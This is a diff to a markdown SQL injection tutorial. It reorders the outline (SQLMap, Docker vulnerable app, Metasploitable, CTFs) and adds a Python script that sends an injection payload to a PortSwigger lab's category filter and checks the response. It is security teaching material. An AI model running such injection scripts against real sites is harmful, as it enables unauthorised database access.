@@ -13,11 +13,13 @@
   - Practicing with PortSwigger SQL Injection Labs
     - Manual Exploitation via manipulating the URL
     - Writing a Python Script to automate the exploitation process
-    - Using SQL Map to exploit the Vulnerability
   - Exploit MetaSpoitable2 VM
     - Security Level 0 => (No Protection) ==> - Manual Exploitation via entering the Payload in the input fields
     - Security Level 1 => (Basic Protection) ==> Bypass Frontend Validation with **Zap Proxy**
     - Security Level 2 => (Advanced Protection) ==> Show the secure code
+  - Using SQL Map to make life easier
+    - Setup Docker Container with Vulnerable Web Application
+    - Exploit the Vulnerability with SQL Map
   - Solving CTF Challenges
     - PicoCTF SQL Injection
     - HackTheBox or TryHackMe Rooms
@@ -80,11 +82,46 @@ $result = $stmt->get_result();
 
 ## **Part 2: Let's Hack It! ^^**
 
-### 2.1 Practicing with - [PortSwigger](https://portswigger.net/web-security/sql-injection) SQL Injection Labs
+### 2.1 Practicing with [PortSwigger](https://portswigger.net/web-security/sql-injection) SQL Injection Labs
 
 #### 2.1.1 Manual Exploitation via manipulating the URL
 
 - [Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
+
+#### 2.1.2 Writing a Python Script to automate the exploitation process
+
+```python
+import requests
+import sys
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+def exploit_sqli(url, payload):
+    uri = '/filter?category='
+    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
+    if "Cat Grin" in r.text:
+        return True
+    else:
+        return False
+
+if __name__ == "__main__":
+    try:
+        url = sys.argv[1].strip()
+        payload = sys.argv[2].strip()
+    except IndexError:
+        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
+        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
+        sys.exit(-1)
+
+    if exploit_sqli(url, payload):
+        print("[+] SQL injection successful!")
+    else:
+        print("[-] SQL injection unsuccessful!")
+```
+
+#### 2.1.3 Using SQL Map to exploit the Vulnerability
 
 ---
 
